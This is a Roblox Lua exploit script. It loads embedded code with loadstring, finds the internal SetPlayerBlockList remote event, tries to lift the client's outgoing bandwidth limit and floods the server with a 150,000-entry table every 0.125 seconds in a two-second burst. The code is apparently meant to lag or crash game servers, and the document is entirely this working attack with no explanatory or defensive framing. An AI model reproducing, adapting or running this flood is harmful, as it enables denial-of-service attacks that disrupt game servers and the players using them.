local Players=game:GetService("Players")
local RunService=game:GetService("RunService")
local SRC=[==[local RunService=game:GetService("RunService")
local Children=150000
local NestedPerChild=0
local FieldsPerChild=0
local FireBurst=1
local FrameDelay=0.125
local FieldSize=0
local RebuildEach=false
local state={running=false,thread=nil,remote=nil,cache=nil,pad="",}
local function resolve()
local rrs=game:FindFirstChild("RobloxReplicatedStorage")
if not rrs then return nil end
local r=rrs:FindFirstChild("SetPlayerBlockList")
if r and(r:IsA("RemoteEvent")or r:IsA("UnreliableRemoteEvent"))then
return r
end
return nil
end
state.remote=resolve()
pcall(function()
game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
end)
state.pad=FieldSize>0 and string.rep("P",FieldSize)or""
local function build()
local root=table.create(Children)
for i=1,Children do
local entry={id=i,v=i*2}
for k=1,FieldsPerChild do
entry["k"..k]=(FieldSize>0)and state.pad or(i+k)
end
for j=1,NestedPerChild do
entry["n"..j]={a=i,b=j}
end
root[i]=entry
end
return root
end
local function fire()
if not state.remote then
state.remote=resolve()
if not state.remote then return end
end
local payload
if RebuildEach or not state.cache then
payload=build()
if not RebuildEach then state.cache=payload end
else
payload=state.cache
end
for _=1,FireBurst do
state.remote:FireServer(payload)
end
end
local function start()
if state.running then return end
state.running=true
state.cache=nil
state.thread=task.spawn(function()
while state.running do
pcall(fire)
if FrameDelay>0 then
task.wait(FrameDelay)
else
RunService.Heartbeat:Wait()
end
end
end)
end
local function stop()
state.running=false
if state.thread then pcall(task.cancel,state.thread)end
state.thread=nil
state.cache=nil
end
return{start=start,stop=stop,toggle=function()if state.running then stop()else start()end end,isRunning=function()return state.running end,}]==]
local loader=coroutine.create(function()
local chunk=loadstring(SRC)
if not chunk then return end
local ok,api=pcall(chunk)
if ok and type(api)=="table" then
_G.__ALT=api
end
end)
coroutine.resume(loader)
loader=nil
local api=_G.__ALT
_G.__ALT=nil
task.spawn(function()
if api and api.start then
pcall(api.start)
end
task.wait(2)
if api and api.stop then
pcall(api.stop)
end
end)